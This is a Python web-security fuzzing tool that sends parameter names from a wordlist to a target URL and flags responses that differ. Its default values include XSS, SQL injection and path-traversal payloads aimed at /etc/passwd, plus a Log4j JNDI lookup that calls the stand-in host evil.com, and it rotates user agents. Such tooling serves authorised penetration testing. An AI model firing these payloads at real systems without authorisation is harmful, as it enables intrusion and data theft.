import requests
import threading
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Any, Optional

class ParameterFuzzer:
    """
    A class for fuzzing URL parameters to discover hidden parameters and potential vulnerabilities.
    """
    
    def __init__(self, target_url: str, wordlist: List[str], parameter_values: List[str] = None, 
                 threads: int = 10, timeout: int = 10, debug: bool = False):
        """
        Initialize the ParameterFuzzer with target URL and fuzzing parameters.
        
        Args:
            target_url (str): The base URL to test parameters against
            wordlist (List[str]): List of parameter names to test
            parameter_values (List[str], optional): List of values to use for parameters. 
                                                   Defaults to ['test', '1', 'true'].
            threads (int, optional): Number of concurrent threads to use. Defaults to 10.
            timeout (int, optional): Request timeout in seconds. Defaults to 10.
        """
        self.target_url = target_url.rstrip('/')
        self.wordlist = wordlist
        # Expanded parameter values including special characters and SQL injection patterns
        self.parameter_values = parameter_values or [
            'test', '1', 'true',  # Original values
            '"><script>alert(1)</script>',  # XSS test
            "' OR '1'='1", "' OR 1=1--", "admin' --",  # SQL injection patterns
            '../../../etc/passwd',  # Path traversal
            '${jndi:ldap://evil.com/x}',  # Log4j/JNDI injection
            '${7*7}',  # Expression evaluation test
            '*',  # Wildcard
            '%%',  # Format string
            '!@#$%^&*()',  # Special characters
            'null',  # Null value test
            '0',  # Zero value
            '-1'  # Negative value
        ]
        self.threads = threads
        self.timeout = timeout
        self.debug = debug  # Added debug flag for verbose output
        self.results = []
        self.lock = threading.Lock()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]

    def _get_random_user_agent(self) -> str:
        """Get a random user agent from the list."""
        return random.choice(self.user_agents)

    def _test_parameter(self, parameter: str) -> Dict[str, Any]:
        """
        Test a single parameter with different values.
        
        Args:
            parameter (str): The parameter name to test
            
        Returns:
            Dict[str, Any]: Results of the parameter test
        """
        headers = {'User-Agent': self._get_random_user_agent()}
        results = []
        
        for value in self.parameter_values:
            params = {parameter: value}
            url = self.target_url
            
            try:
                start_time = time.time()
                response = requests.get(
                    url, 
                    params=params, 
                    headers=headers, 
                    timeout=self.timeout,
                    allow_redirects=True
                )
                response_time = time.time() - start_time
                
                # Create result dictionary
                result = {
                    'parameter': parameter,
                    'value': value,
                    'url': response.url,
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'response_time': response_time,
                    'content_type': response.headers.get('Content-Type', ''),
                    'redirects': len(response.history) > 0,
                    'redirect_url': response.url if len(response.history) > 0 else None
                }
                
                results.append(result)
                # Print detailed debug information for each request
                if self.debug:
                    print(f"Tested: {parameter}={value} | Status: {result['status_code']} | Length: {result['content_length']} | Time: {result['response_time']:.2f}s")
                
            except requests.RequestException as e:
                result = {
                    'parameter': parameter,
                    'value': value,
                    'url': f"{url}?{parameter}={value}",
                    'status_code': None,
                    'content_length': None,
                    'response_time': None,
                    'content_type': None,
                    'error': str(e)
                }
                results.append(result)
        
        return results

    def _worker(self, parameter: str) -> None:
        """
        Worker method to process a parameter and add results to the results list.
        
        Args:
            parameter (str): The parameter to test
        """
        results = self._test_parameter(parameter)
        
        with self.lock:
            self.results.extend(results)

    def fuzz(self) -> List[Dict[str, Any]]:
        """
        Start the parameter fuzzing process.
        
        Returns:
            List[Dict[str, Any]]: Results of the fuzzing process
        """
        self.results = []
        
        print(f"Starting parameter fuzzing against {self.target_url}")
        print(f"Testing {len(self.wordlist)} parameters with {len(self.parameter_values)} different values per parameter")
        print(f"Using {self.threads} threads with {self.timeout}s timeout")
        print("-" * 80)
        
        logging.info(f"Starting parameter fuzzing against {self.target_url} with {len(self.wordlist)} parameters")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self._worker, self.wordlist)
        
        logging.info(f"Parameter fuzzing completed. Found {len(self.results)} results.")
        print(f"Parameter fuzzing completed. Processed {len(self.results)} requests.")
        
        # Sort results by status code and content length for better readability
        self.results.sort(key=lambda x: (x.get('status_code', 999), x.get('content_length', 0)), reverse=True)
        
        return self.results

    def analyze_results(self) -> Dict[str, Any]:
        """
        Analyze the fuzzing results to identify interesting parameters.
        
        Returns:
            Dict[str, Any]: Analysis of the results including interesting parameters
        """
        if not self.results:
            return {'error': 'No results available. Run fuzz() first.'}
        
        # Group results by parameter
        parameter_groups = {}
        for result in self.results:
            param = result.get('parameter')
            if param not in parameter_groups:
                parameter_groups[param] = []
            parameter_groups[param].append(result)
        
        # Identify interesting parameters (those with varying responses)
        interesting_parameters = []
        
        for param, results in parameter_groups.items():
            status_codes = set(r.get('status_code') for r in results if r.get('status_code') is not None)
            content_lengths = set(r.get('content_length') for r in results if r.get('content_length') is not None)
            
            # Parameters with multiple different status codes or content lengths are interesting
            # Lowered the content length difference threshold from 100 to 50 for more sensitive detection
            # This helps identify subtle changes in responses that might indicate parameter influence
            if len(status_codes) > 1 or (len(content_lengths) > 1 and max(content_lengths) - min(content_lengths) > 50):
                interesting_parameters.append({
                    'parameter': param,
                    'status_codes': list(status_codes),
                    'content_lengths': list(content_lengths),
                    'results': results
                })
        
        # Calculate additional statistics
        status_code_distribution = {}
        for result in self.results:
            status = result.get('status_code')
            if status is not None:
                status_code_distribution[status] = status_code_distribution.get(status, 0) + 1

        return {
            'total_parameters_tested': len(parameter_groups),
            'interesting_parameters': interesting_parameters,
            'all_parameters': list(parameter_groups.keys()),
            'status_code_distribution': status_code_distribution
        }

    def get_results(self) -> List[Dict[str, Any]]:
        """
        Get the current results.
        
        Returns:
            List[Dict[str, Any]]: Current fuzzing results
        """
        return self.results


# Example usage
if __name__ == "__main__":
    import os
    import sys
    from datetime import datetime
    
    # Add parent directory to path to allow imports
    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
    
    # Import the configuration loader
    from src.utils.config_loader import load_config
    
    # Load configuration
    config = load_config()
    base_url = config.get("target_url")
    timeout = config.get("request_options", {}).get("timeout", 10)
    
    # Sample parameter wordlist
    # Expanded wordlist with common web application parameters
    wordlist = [
        # Original parameters
        "id", "page", "user", "search", "query", "file", "token", "action",
        "redirect", "auth", "username", "password", "login", "email",
        
        # Authentication and user-related parameters
        "user_id", "userid", "uid", "account", "member", "admin", "role", "permission",
        "access_token", "jwt", "api_key", "apikey", "key", "secret",
        
        # Common web parameters
        "sort", "order", "filter", "limit", "offset", "start", "length",
        "callback", "jsonp", "format", "view", "template", "theme", "lang", "language",
        
        # Session and state parameters
        "session", "sessionid", "csrf", "csrftoken", "xsrf", "state",
        
        # File operations
        "upload", "download", "path", "folder", "directory", "filename", "type",
        
        # Data manipulation
        "data", "input", "content", "text", "name", "value", "title", "description",
        "code", "source", "output", "result", "status", "error", "debug",
        
        # URL navigation
        "url", "uri", "next", "target", "return", "returnurl", "continue", "goto",
        
        # HTTP methods as parameters
        "method", "mode", "option", "cmd", "func", "function", "op", "operation"
    ]
    
    print(f"Starting parameter fuzzing against {base_url}")
    
    # Initialize the parameter fuzzer
    fuzzer = ParameterFuzzer(
        target_url=base_url,
        wordlist=wordlist,
        threads=5,
        timeout=timeout,
        debug=True  # Enable debug output for better visibility
    )
    
    # Run the fuzzer
    results = fuzzer.fuzz()
    
    # Get analysis
    analysis = fuzzer.analyze_results()
    
    # Print results
    print(f"Parameter fuzzing completed. Tested {len(wordlist)} parameters.")
    print(f"Found {len(analysis.get('interesting_parameters', []))} interesting parameters.")
    
    # Display status code distribution
    print("\nStatus Code Distribution:")
    for status_code, count in analysis.get('status_code_distribution', {}).items():
        print(f"  {status_code}: {count} responses")
    
    # Display interesting parameters
    for param in analysis.get('interesting_parameters', []):
        print(f"- Parameter: {param['parameter']}")
        print(f"  Status codes: {param['status_codes']}")
        print(f"  Content lengths: {param['content_lengths']}")
        
        # Show example URLs for interesting parameters
        print("  Example test URLs:")
        for i, result in enumerate(param['results'][:3]):  # Show up to 3 examples
            print(f"    {result.get('url')} → Status: {result.get('status_code')} | Length: {result.get('content_length')}")
        print("")

